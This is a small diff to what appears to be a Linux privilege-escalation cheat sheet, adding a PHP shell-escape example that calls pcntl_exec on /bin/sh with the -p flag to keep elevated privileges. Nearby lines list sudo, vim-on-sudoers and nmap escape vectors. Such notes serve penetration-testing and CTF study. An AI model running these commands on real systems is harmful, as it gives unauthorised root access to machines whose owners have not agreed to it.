@@ -40,6 +40,9 @@ $ ./pspy64
 # - sudo (shell escape)
 # - vim (vi /etc/sudoers)
 # - nmap (--script bypass)
+
+# Example: PHP shell escape
+$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
 
 ## Windows Privilege Escalation
